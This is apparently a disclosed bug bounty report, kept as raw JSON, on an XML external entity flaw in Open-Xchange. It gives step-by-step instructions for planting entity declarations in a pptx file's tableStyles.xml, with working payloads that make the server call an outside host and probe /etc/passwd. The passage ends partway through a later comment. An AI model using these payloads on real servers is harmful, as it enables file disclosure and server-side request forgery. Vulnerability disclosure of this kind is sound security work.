I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible to read arbitrary files from the server as described here: \nhttp://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html.\n\n I'll try to follow up with a full poc for reading files later today/tomorrow.\n\n## Steps to Reproduce\n1. Create a powerpoint slide.\n2. Open the created file using winrar (a pptx file is actually an archive).\n3. Extract the tableStyles.xml file which is located in the ppt folder and open it in your favorite editor. It should look something like this:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e\n\u003ca:tblStyleLst xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" def=\"{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}\"/\u003e\n```\nNow, setup a server where you can view incoming connections and save the file to look like this:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e\n\u003c!DOCTYPE r [\u003c!ELEMENT r ANY \u003e\u003c!ENTITY sp SYSTEM \"https://{your-address}/\"\u003e]\u003e\u003cr\u003e\u0026sp;\u003c/r\u003e\n\u003ca:tblStyleLst xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" def=\"{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}\"/\u003e\n```\n\n4. Put the updated file back into the pptx by dragging it to the ppt folder.\n5. Upload the file to Open-XChange and open it up. \n6. Check your server logs and see that a request from the user agent: Java/1.8.0_131 was sent.\n\n\n## Payload to view if a file exists on the server\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e\n\u003c!DOCTYPE r [\u003c!ELEMENT r ANY \u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\u003c!ENTITY sp SYSTEM \"https://{your-server}/\"\u003e]\u003e\u003cr\u003e\u0026xxe;\u0026sp;\u003c/r\u003e\n\u003ca:tblStyleLst xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" def=\"{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}\"/\u003e\n```\n\nIf you receive a request to the server this means the file exists. For example this payload:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e\n\u003c!DOCTYPE r [\u003c!ELEMENT r ANY \u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwdafasdfqwe\"\u003e\u003c!ENTITY sp SYSTEM \"https://recorder.run.aws-usw02-pr.ice.predix.io/\"\u003e]\u003e\u003cr\u003e\u0026xxe;\u0026sp;\u003c/r\u003e\n\u003ca:tblStyleLst xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" def=\"{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}\"/\u003e\n```\n\nwill not generate an http request to your server.\n\n## Impact\n\nAn attacker can extract different data from the server (possibly read local files), and make arbitrary request to any server.","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":54,"name":"XML External Entities (XXE)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-07-23T09:49:59.641Z","allow_singular_disclosure_after":-101624240.01597661,"singular_disclosure_allowed":true,"vote_count":85,"voters":["test0x00","last_jedi","jokebookservice1","arneswinnen","msultan","akshansh","hogarth45","albinowax","kapytein","secator","and 75 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2578704,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey,\n\nIt seems that during my testing I have caused an overloading of connections (or you have deployed a code change?) and my POC doesn't work anymore.
